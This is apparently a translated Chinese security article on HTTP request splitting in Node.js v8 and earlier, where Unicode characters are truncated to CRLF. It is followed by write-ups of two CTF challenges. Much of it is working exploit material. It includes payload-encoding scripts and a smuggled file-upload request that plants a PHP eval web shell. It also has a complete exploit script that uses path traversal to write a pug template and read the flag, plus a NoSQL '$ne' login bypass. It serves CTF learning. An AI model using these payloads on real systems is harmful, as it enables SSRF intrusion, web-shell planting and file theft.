# NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击

阅读量 **220479**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-06-16 15:30:19

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t014d1d3c67fa390eab.jpg)

## 前言

2018 年有研究者发现，当 Node.js 使用 `http.get` 向特定路径发出HTTP请求时，发出的请求实际上被定向到了不一样的路径！

![](https://p5.ssl.qhimg.com/t01af324f2b225642c5.png)

深入研究一下，发现这个问题是由于 Node.js 将 HTTP 请求写入路径时，对 Unicode 字符的有损编码引起的。

## HTTP 请求路径中的 Unicode 字符损坏

虽然用户发出的 HTTP
请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的Unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码字符集，不能表示高编号的Unicode字符，例如🐶这个表情。所以，当我们的请求路径中含有多字节编码的Unicode字符时，会被截断取最低字节，比如
`\u0130` 就会被截断为 `\u30`：

![](https://p3.ssl.qhimg.com/t01272e77ba4c7d9a0b.png)

## Unicode 字符损坏造成的 HTTP 拆分攻击

刚才演示的那个 HTTP 请求路径中的 Unicode 字符损坏看似没有什么用处，但它可以在 nodejs 的 HTTP 拆分攻击中大显身手。

由于 Nodejs 的 HTTP 库包含了阻止 CRLF 的措施，即如果你尝试发出一个 URL 路径中含有回车、换行或空格等控制字符的 HTTP
请求是，它们会被 URL 编码，所以正常的 CRLF 注入在 Nodejs 中并不能利用：

    
    
    > var http = require("http");
    > http.get('http://47.101.57.72:4000/\r\n/WHOAMI').output
    [ 'GET /%0D%0A/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
    

![](https://p5.ssl.qhimg.com/t0161ddd4c44ab5f103.png)

但不幸的是，上述的处理Unicode字符错误意味着可以规避这些保护措施。考虑如下的URL，其中包含一些高编号的Unicode字符：

    
    
    > 'http://47.101.57.72:4000/\u{010D}\u{010A}/WHOAMI'
    http://47.101.57.72:4000/čĊ/WHOAMI
    

当 Node.js v8 或更低版本对此URL发出 `GET` 请求时，它不会进行编码转义，因为它们不是HTTP控制字符：

    
    
    > http.get('http://47.101.57.72:4000/\u010D\u010A/WHOAMI').output
    [ 'GET /čĊ/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
    

但是当结果字符串被编码为 latin1 写入路径时，这些字符将分别被截断为 “\r”（%0d）和 “\n”（%0a）：

    
    
    > Buffer.from('http://47.101.57.72:4000/\u{010D}\u{010A}/WHOAMI', 'latin1').toString()
    'http://47.101.57.72:4000/\r\n/WHOAMI'
    

![](https://p0.ssl.qhimg.com/t010da577eb0574557d.png)

可见，通过在请求路径中包含精心选择的Unicode字符，攻击者可以欺骗Node.js并成功实现CRLF注入。

不仅是CRLF，所有的控制字符都可以通过这个构造出来。下面是我列举出来的表格，第一列是需要构造的字符，第二列是可构造出相应字符的高编号的Unicode码，第三列是高编号的Unicode码对应的字符，第四列是高编号的Unicode码对应的字符的URL编码：

字符 | 可由以下Unicode编码构造出 | Unicode编码对应的字符 | Unicode编码对应的字符对应的URL编码  
---|---|---|---  
回车符 \r | \u010d | č | %C4%8D  
换行符 \n | \u010a | Ċ | %C4%8A  
空格 | \u0120 | Ġ | %C4%A0  
反斜杠 \ | \u0122 | Ģ | %C4%A2  
单引号 ‘ | \u0127 | ħ | %C4%A7  
反引号 ` | \u0160 | Š | %C5%A0  
叹号 ! | \u0121 | ġ | %C4%A1  
  
这个bug已经在Node.js10中被修复，如果请求路径包含非Ascii字符，则会抛出错误。但是对于 Node.js v8
或更低版本，如果有下列情况，任何发出HTTP请求的服务器都可能受到通过请求拆实现的SSRF的攻击：

  * 接受来自用户输入的Unicode数据
  * 并将其包含在HTTP请求的路径中
  * 且请求具有一个0长度的主体（比如一个 `GET` 或者 `DELETE`）

## 在 HTTP 状态行注入恶意首部字段

由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入恶意的 HTTP 首部字段的话还需要闭合状态行中 `HTTP/1.1`
，即保证注入后有正常的 HTTP 状态行：

    
    
    > http.get('http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami').output
    [ 'GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
    

![](https://p0.ssl.qhimg.com/t01be6ff6d202ad92bc.png)

如上图所示，成功构造出了一个 Set-Cookie 首部字段，虽然后面还有一个 `HTTP/1.1` ，但我们根据该原理依然可以将其闭合：

    
    
    > http.get('http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:').output
    [ 'GET /ĠHTTP/1.1čĊSet-Cookie:ĠPHPSESSID=whoamičĊtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n' ]
    

![](https://p0.ssl.qhimg.com/t0108dbf556f318ef33.png)

这样，我们便可以构造 “任意” 的HTTP请求了。

## 在 HTTP 状态行注入完整 HTTP 请求

首先，由于 NodeJS 的这个 CRLF 注入点在 HTTP 状态行，所以如果我们要注入完整的 HTTP 请求的话需要先闭合状态行中 `HTTP/1.1`
，即保证注入后有正常的 HTTP 状态行。其次为了不让原来的 `HTTP/1.1` 影响我们新构造的请求，我们还需要再构造一次 `GET /` 闭合原来的
HTTP 请求。

假设目标主机存在SSRF，需要我们在目标主机本地上传文件。我们需要尝试构造如下这个文件上传的完整 POST 请求：

    
    
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
    Connection: close
    
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="MAX_FILE_SIZE"
    
    100000
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="uploaded"; filename="shell.php"
    Content-Type: application/octet-stream
    
    <?php eval($_POST["whoami"]);?>
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    

为了方便，我们将这个POST请求里面的所有的字符包括控制符全部用上述的高编号Unicode码表示：

    
    
    payload = ''' HTTP/1.1
    
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
    Connection: close
    
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="MAX_FILE_SIZE"
    
    100000
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="uploaded"; filename="shell.php"
    Content-Type: application/octet-stream
    
    <?php eval($_POST["whoami"]);?>
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    
    GET / HTTP/1.1
    test:'''.replace("\n","\r\n")
    
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    
    payload = payload_encode(payload)
    print(payload)
    
    # 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ
    

构造请求：

    
    
    > http.get('http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ')
    

![](https://p1.ssl.qhimg.com/t018de56831664482ab.png)

如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。

但是有一个问题，就是当我们将这个请求包里面的所有的字符包括控制字符全部用高编号Unicode码表示的话，最终生成的 Payload
的长度可能会过长，有对于有些服务器来说，如果我们请求的 URL 长度超过了限制的长度之后会报错。而且有的题目还需要对 Payload 进行 URL
编码甚至二次或三次编码，这样 Payload 的长度就更长了，所以我们还是建议只将那些控制字符用高编号Unicode编码就行了。编写新的 Payload
转换脚本：

    
    
    payload = ''' HTTP/1.1
    
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4
    Connection: close
    
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="MAX_FILE_SIZE"
    
    100000
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="uploaded"; filename="shell.php"
    Content-Type: application/octet-stream
    
    <?php eval($_POST["whoami"]);?>
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    
    GET / HTTP/1.1
    test:'''.replace("\n","\r\n")
    
    payload = payload.replace('\r\n', '\u010d\u010a') \
        .replace('+', '\u012b') \
        .replace(' ', '\u0120') \
        .replace('"', '\u0122') \
        .replace("'", '\u0a27') \
        .replace('[', '\u015b') \
        .replace(']', '\u015d') \
        .replace('`', '\u0127') \
        .replace('"', '\u0122') \
        .replace("'", '\u0a27') \
        .replace('[', '\u015b') \
        .replace(']', '\u015d') \
    
    print(payload)
    
    # 输出: ĠHTTP/1.1čĊčĊPOSTĠ/upload.phpĠHTTP/1.1čĊHost:Ġ127.0.0.1čĊContent-Length:Ġ437čĊContent-Type:Ġmultipart/form-data;Ġboundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6čĊUser-Agent:ĠMozilla/5.0Ġ(WindowsĠNTĠ10.0;ĠWin64;Ġx64)ĠAppleWebKit/537.36Ġ(KHTML,ĠlikeĠGecko)ĠChrome/90.0.4430.72ĠSafari/537.36čĊAccept:Ġtext/html,application/xhtmlīxml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9čĊAccept-Encoding:Ġgzip,ĠdeflatečĊAccept-Language:Ġzh-CN,zh;q=0.9čĊCookie:ĠPHPSESSID=nk67astv61hqanskkddslkgst4čĊConnection:ĠclosečĊčĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6čĊContent-Disposition:Ġform-data;Ġname=ĢMAX_FILE_SIZEĢčĊčĊ100000čĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6čĊContent-Disposition:Ġform-data;Ġname=ĢuploadedĢ;Ġfilename=Ģshell.phpĢčĊContent-Type:Ġapplication/octet-streamčĊčĊ<?phpĠeval($_POSTśĢwhoamiĢŝ);?>čĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6čĊContent-Disposition:Ġform-data;Ġname=ĢUploadĢčĊčĊUploadčĊ------WebKitFormBoundaryjDb9HMGTixAA7Am6--čĊčĊGETĠ/ĠHTTP/1.1čĊtest:
    

其实主要就是将 `\r\n` 和空格进行编码，其他的字符如果是题目对他们做了过滤也可以自己加进去。最好是将所有的控制字符全部编码。

下面我们分析一下整个攻击的过程。

原始请求数据如下：

    
    
    GET / HTTP/1.1
    Host: 47.101.57.72:4000
    

当我们插入CRLF数据后，HTTP请求数据变成了：

    
    
    GET / HTTP/1.1
    
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    ......
    <?php eval($_POST["whoami"]);?>
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    
     HTTP/1.1
    Host: 47.101.57.72:4000
    

上次请求包的Host字段和状态行中的 `HTTP/1.1` 就单独出来了，所以我们再构造一个请求把他闭合：

    
    
    GET / HTTP/1.1
    
    POST /upload.php HTTP/1.1
    Host: 127.0.0.1
    Content-Length: 437
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6
    ......
    <?php eval($_POST["whoami"]);?>
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6
    Content-Disposition: form-data; name="Upload"
    
    Upload
    ------WebKitFormBoundaryjDb9HMGTixAA7Am6--    
    GET / HTTP/1.1
    test: HTTP/1.1
    Host: 47.101.57.72:4000
    

## [GYCTF2020]Node Game

进入题目：

![](https://p4.ssl.qhimg.com/t0106ed747d26dc7f4a.png)

“Only admin can use this”进去之后是一个文件上传页面，但是只有admin才能上传文件：

![](https://p1.ssl.qhimg.com/t01549d6e5c76b292e0.png)

“Click here to get the source” 可以查看源码：

    
    
    var express = require('express');
    var app = express();
    var fs = require('fs');
    var path = require('path');
    var http = require('http');
    var pug = require('pug');
    var morgan = require('morgan');    // morgan是express默认的日志中间件
    const multer = require('multer');    // Multer是nodejs中处理multipart/form-data数据格式(主要用在上传功能中）的中间件。该中间件不处理multipart/form-data数据格式以外的任何形式的数据
    
    
    app.use(multer({dest: './dist'}).array('file'));
    app.use(morgan('short'));
    app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
    app.use("/template",express.static(path.join(__dirname, '/template')))
    
    app.get('/', function(req, res) {
        var action = req.query.action?req.query.action:"index";
        if( action.includes("/") || action.includes("\\") ){    // action中不能含有/或\\字符
            res.send("Errrrr, You have been Blocked");
        }
        file = path.join(__dirname + '/template/'+ action +'.pug');
        var html = pug.renderFile(file);    // 渲染pug模板引擎
        res.send(html);
    });
    
    app.post('/file_upload', function(req, res){
        var ip = req.connection.remoteAddress;
        var obj = {
            msg: '',
        }
        if (!ip.includes('127.0.0.1')) {    // remoteAddress必须是本地IP,所以需要进行ssrf
            obj.msg="only admin's ip can use it"
            res.send(JSON.stringify(obj));    // JSON.stringify() 方法用于将 JavaScript 值转换为 JSON 字符串。
            return 
        }
        fs.readFile(req.files[0].path, function(err, data){
            if(err){
                obj.msg = 'upload failed';
                res.send(JSON.stringify(obj));
            }else{
                var file_path = '/uploads/' + req.files[0].mimetype +"/";    
                var file_name = req.files[0].originalname
                var dir_file = __dirname + file_path + file_name    // /uploads/mimetype/filename.ext, 这里可通过mimetype进行目录穿越
                if(!fs.existsSync(__dirname + file_path)){    // 以同步的方法检测目录是否存在
                    try {
                        fs.mkdirSync(__dirname + file_path)    // 如果目录不存在则创建目录
                    } catch (error) {
                        obj.msg = "file type error";
                        res.send(JSON.stringify(obj));
                        return
                    }
                }
                try {
                    fs.writeFileSync(dir_file,data)    // 将要上传的文件写入文件到指定的目录中(实现文件上传)
                    obj = {
                        msg: 'upload success',
                        filename: file_path + file_name
                    } 
                } catch (error) {
                    obj.msg = 'upload failed';
                }
                res.send(JSON.stringify(obj));    
            }
        })
    })
    
    app.get('/source', function(req, res) {
        res.sendFile(path.join(__dirname + '/template/source.txt'));
    });
    
    app.get('/core', function(req, res) {
        var q = req.query.q;
        var resp = "";    // 用来接收请求的数据
        if (q) {
            var url = 'http://localhost:8081/source?' + q
            console.log(url)
            var trigger = blacklist(url);
            if (trigger === true) {
                res.send("<p>error occurs!</p>");
            } else {
                try {
                    http.get(url, function(resp) {
                        resp.setEncoding('utf8');
                        resp.on('error', function(err) {
                        if (err.code === "ECONNRESET") {
                         console.log("Timeout occurs");
                         return;
                        }
                       });
    
                        resp.on('data', function(chunk) {
                            try {
                             resps = chunk.toString();
                             res.send(resps);
                            }catch (e) {
                               res.send(e.message);
                            }
    
                        }).on('error', (e) => {
                             res.send(e.message);});
                    });
                } catch (error) {
                    console.log(error);
                }
            }
        } else {
            res.send("search param 'q' missing!");
        }
    })
    
    function blacklist(url) {    // 检测url中的恶意字符,检测到的返回true。可以通过字符串拼接绕过。
        var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
        var arrayLen = evilwords.length;
        for (var i = 0; i < arrayLen; i++) {
            const trigger = url.includes(evilwords[i]);
            if (trigger === true) {
                return true
            }
        }
    }
    
    var server = app.listen(8081, function() {
        var host = server.address().address
        var port = server.address().port
        console.log("Example app listening at http://%s:%s", host, port)
    })
    

大概看一下几个路由：

  * /：会包含/template目录下的一个pug模板文件并用pub模板引擎进行渲染
  * /source：回显源码
  * /file_upload：限制了只能由127.0.0.1的ip将文件上传到uploads目录里面，所以需要进行ssrf。并且我们可以通过控制mimetype进行目录穿越，从而将文件上传到任意目录。
  * /core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。

根据上面几点，可以大致判断是利用SSRF伪造本地ip进行文件上传，上传一个pug模板文件（可以搜一下pug文件的代码格式[https://www.pugjs.cn/language/includes.html）到/template目录下，这个pug模板文件中含有将根目录里的flag包含进来的代码，然后用?action=来包含该文件，就可读取到flag。](https://www.pugjs.cn/language/includes.html%EF%BC%89%E5%88%B0/template%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%BF%99%E4%B8%AApug%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6%E4%B8%AD%E5%90%AB%E6%9C%89%E5%B0%86%E6%A0%B9%E7%9B%AE%E5%BD%95%E9%87%8C%E7%9A%84flag%E5%8C%85%E5%90%AB%E8%BF%9B%E6%9D%A5%E7%9A%84%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E7%94%A8?action=%E6%9D%A5%E5%8C%85%E5%90%AB%E8%AF%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%B1%E5%8F%AF%E8%AF%BB%E5%8F%96%E5%88%B0flag%E3%80%82)

看到`/core`路由，关键代码在这里：

    
    
    if (q) {
            var url = 'http://localhost:8081/source?' + q
            console.log(url)
            var trigger = blacklist(url);
            if (trigger === true) {
                res.send("<p>error occurs!</p>");
            } else {
                try {
                    http.get(url, function(resp) {
    

可以传入一个q参数，然后服务器去请求，这里就存在一个SSRF了，可以通过这个点，来进行一个拆分请求，从而可以利用刚刚的文件上传点将我们的文件上传上去。这就涉及到了前面讲的
NodeJS的Unicode编码造成的CRLF注入问题了。如果对Unicode编码经过精心的构造，就可以通过拆分请求实现的SSRF攻击（也就是一种CRLF注入），通过换行让服务端将我们的第一次请求下面构造的报文内容，当作一次单独的HTTP请求，而这个构造的请求就是我们的文件上传请求了。

接下来抓包并构造请求即可：

![](https://p4.ssl.qhimg.com/t010a9cb0325cc89a52.png)

对抓取到的文件上传的数据包进行删除Cookie，并将Host、Origin、Referer等改为本地地址、Content-Type改为
`../template` 用于目录穿越（注意Content-Length也需要改成变化后的值），然后编写以下利用脚本：

    
    
    import urllib.parse
    import requests
    
    payload = ''' HTTP/1.1
    
    POST /file_upload HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 266
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    Origin: http://127.0.0.1:8081
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryG01qmiZ5h6Ap0QSc
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Referer: http://127.0.0.1:8081/?action=upload
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    
    ------WebKitFormBoundaryG01qmiZ5h6Ap0QSc
    Content-Disposition: form-data; name="file"; filename="shell.pug"
    Content-Type: ../template
    
    doctype html
    html
      head
        style
          include ../../../../../../../flag.txt
    ------WebKitFormBoundaryG01qmiZ5h6Ap0QSc--    
    GET / HTTP/1.1
    test:'''.replace("\n", "\r\n")
    
    def payload_encode(raw):
        ret = u""
        for i in raw:
            ret += chr(0x0100+ord(i))
        return ret
    
    payload = payload_encode(payload)
    print(payload)
    
    r = requests.get('http://b5db3d85-4230-43f3-84d2-de9a952a0451.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))
    print(r.text)
    

执行脚本后即可成功进行目录穿越，将shell.pug文件上传到template目录中，然后访问 `/?action=shell` 即可得到flag：

![](https://p4.ssl.qhimg.com/t01b9e4aaa4f1eb49c1.png)

## [2021 MRCTF]Half-Nosqli

![](https://p3.ssl.qhimg.com/t01527dfbcfdc72985a.png)

进入题目，啥也没有，目录扫描找到了 `/docs`，访问得到一个Swagger UI：

![](https://p5.ssl.qhimg.com/t016e16d0cb860a1e4b.png)

有两个Api接口，一个是 `/login` 用于登录，另一个是 `/home` 可通过url属性进行
SSRF。我们可以编写脚本来访问这两个Api接口。首先访问 `/home`接口报错，因为需要验证，所以思路应该是先访问 `/login`
接口进行登录，登录后拿到token再去访问 `/home`
接口。这里由于题目提示了是NoSQL，所以我们直接使用NoSQL的永真trick绕过：<https://www.anquanke.com/post/id/97211#h2-10>

所以最终的脚本如下：

    
    
    import requests
    import json
    
    url = "http://node.mrctf.fun:23000/"
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    
    json_data2 = {
        "url":"http://47.101.57.72:4000"    # 通过这里的url值进行SSRF
    }
    
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
    

这样我们便可以通过 `/home` 接口的url值进行SSRF了，先访问一下自己的 VPS 试试：

![](https://p4.ssl.qhimg.com/t019cf816f0e375ce8b.png)

成功。

然后接下来就是利用 Node JS 的 HTTP 响应拆分攻击构造 SSRF 去打他本地的 FTP，原理在前面的几节中已经讲得很清楚了。由于题目给出了
docker-compose.yml，在这里面发现了FTP的主机名为 `ftp`，端口为 8899。

